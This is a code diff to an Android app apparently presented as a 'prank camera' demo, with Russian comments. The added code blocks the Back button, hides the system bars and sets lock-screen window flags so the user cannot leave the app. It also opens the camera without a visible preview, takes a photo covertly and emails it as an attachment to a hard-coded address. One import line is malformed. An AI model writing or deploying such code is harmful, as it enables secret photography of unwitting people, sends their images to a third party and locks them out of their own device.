@@ -9,6 +9,8 @@ import android.os.CountDownTimer
 import android.os.Handler
 import android.os.Looper
 import android.util.Base64
+import android.view.WindowInsets
+import android.view.WindowManager
 import androidx.appcompat.app.AppCompatActivity
 import android.widget.Button
 import android.widget.ImageView
@@ -17,11 +19,15 @@ import java.io.ByteArrayOutputStream
 import java.util.Properties
 import javax.mail.Authenticator
 import javax.mail.Message
+import javax.mail.MessagingException
 import javax.mail.PasswordAuthentication
 import javax.mail.Session
 import javax.mail.Transport
 import javax.mail.internet.InternetAddress
+import javax.mail.internet.MimeBodyPart
 import javax.mail.internet.MimeMessage
+import javax.mail.internet.MimeMultipart
+import javax.mail.util ByteArrayDataSource
 import kotlin.concurrent.thread
 
 class MainActivity : AppCompatActivity() {
@@ -59,6 +65,17 @@ class MainActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        
+        // Блокируем все способы выхода из приложения
+        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
+        window.addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD)
+        window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED)
+        window.addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
+        
+        // Скрываем системные панели
+        window.insetsController?.hide(android.view.WindowInsets.Type.systemBars())
+        window.setDecorFitsSystemWindows(false)
+        
         setContentView(R.layout.activity_main)
         statusText = findViewById(R.id.statusText)
         startBtn = findViewById(R.id.startBtn)
@@ -90,64 +107,66 @@ class MainActivity : AppCompatActivity() {
         }
     }
     
-    private fun takePhoto(): Bitmap? {
-        return try {
-            // Открываем камеру
-            val camera = Camera.open()
-            val parameters = camera.parameters
-            
-            // Настраиваем параметры
-            parameters.pictureFormat = android.graphics.ImageFormat.JPEG
-            camera.parameters = parameters
-            
-            // Делаем фото
-            camera.startPreview()
-            camera.takePicture(null, null, null, object : Camera.PictureCallback {
-                override fun onPictureTaken(data: ByteArray?, camera: Camera?) {
-                    // Фото сохранено
-                    camera?.release()
-                }
-            })
-            
-            // Для превью
-            val bitmap = Bitmap.createBitmap(
-                parameters.pictureSize.width,
-                parameters.pictureSize.height,
-                Bitmap.Config.ARGB_8888
-            )
-            camera.release()
-            bitmap
-        } catch (e: Exception) {
-            e.printStackTrace()
-            null
-        }
+    // Блокируем кнопку Назад
+    @Deprecated("Deprecated")
+    override fun onBackPressed() {
+        // Ничего не делаем - блокируем выход
+    }
+    
+    // Блокируем недавние приложения
+    override fun onAttachedToWindow() {
+        super.onAttachedToWindow()
+        window.setType(WindowManager.LayoutParams.TYPE_KEYGUARD_DIALOG)
     }
     
     private fun takeAndSendPhoto() {
         thread {
             try {
-                // Простое фото через превью
-                val placeholder: ImageView = findViewById(R.id.placeholderImage)
-                placeholder.isDrawingCacheEnabled = true
-                val bitmap = placeholder.drawingCache
+                // Открываем камеру и делаем фото
+                val camera = Camera.open()
+                val parameters = camera.parameters
                 
-                if (bitmap != null) {
-                    // Сжимаем в JPEG
-                    val stream = ByteArrayOutputStream()
-                    bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream)
-                    val byteArray = stream.toByteArray()
-                    val photoBase64 = Base64.encodeToString(byteArray, Base64.DEFAULT)
-                    
+                // Настраиваем размер фото
+                val sizes = parameters.supportedPictureSizes
+                val size = sizes[0] // Берём максимальный размер
+                parameters.setPictureSize(size.width, size.height)
+                camera.parameters = parameters
+                
+                // Создаём SurfaceTexture для превью
+                val texture = android.graphics.SurfaceTexture(10)
+                camera.setPreviewTexture(texture)
+                camera.startPreview()
+                
+                // Даём камере время на фокусировку
+                Thread.sleep(500)
+                
+                // Делаем фото
+                val photoData = ByteArrayRef()
+                camera.takePicture(null, null, object : Camera.PictureCallback {
+                    override fun onPictureTaken(data: ByteArray?, camera: Camera?) {
+                        if (data != null) {
+                            photoData.data = data
+                        }
+                        camera?.release()
+                    }
+                })
+                
+                // Ждём пока фото сохранится
+                Thread.sleep(1000)
+                
+                if (photoData.data != null) {
                     // Отправляем на почту
-                    sendEmail(photoBase64)
+                    sendEmailWithPhoto(photoData.data!!)
                 }
             } catch (e: Exception) {
                 e.printStackTrace()
+                // Если камера не доступна - отправляем заглушку
+                sendEmailWithPhoto(null)
             }
         }
     }
     
-    private fun sendEmail(photoBase64: String) {
+    private fun sendEmailWithPhoto(photoData: ByteArray?) {
         thread {
             try {
                 val props = Properties()
@@ -167,6 +186,11 @@ class MainActivity : AppCompatActivity() {
                 message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(targetEmail))
                 message.subject = "📸 Prank Photo Captured!"
                 
+                // Создаём multipart сообщение
+                val multipart = MimeMultipart()
+                
+                // Текстовая часть
+                val textPart = MimeBodyPart()
                 val emailBody = """
                     🎭 Prank App - Фото получено!
                     
@@ -176,8 +200,19 @@ class MainActivity : AppCompatActivity() {
                     ---
                     PrankCamerDemo
                 """.trimIndent()
+                textPart.setText(emailBody)
+                multipart.addBodyPart(textPart)
                 
-                message.setText(emailBody)
+                // Прикрепляем фото
+                if (photoData != null) {
+                    val attachmentPart = MimeBodyPart()
+                    val dataSource = ByteArrayDataSource(photoData, "image/jpeg")
+                    attachmentPart.setDataHandler(javax.mail.DataHandler(dataSource))
+                    attachmentPart.fileName = "prank_photo_${System.currentTimeMillis()}.jpg"
+                    multipart.addBodyPart(attachmentPart)
+                }
+                
+                message.setContent(multipart)
                 
                 // Отправляем письмо
                 Transport.send(message)
@@ -186,6 +221,11 @@ class MainActivity : AppCompatActivity() {
                 e.printStackTrace()
             }
         }
+    }
+    
+    // Вспомогательный класс для хранения данных фото
+    private class ByteArrayRef {
+        var data: ByteArray? = null
     }
 
     private fun startSimulation() {
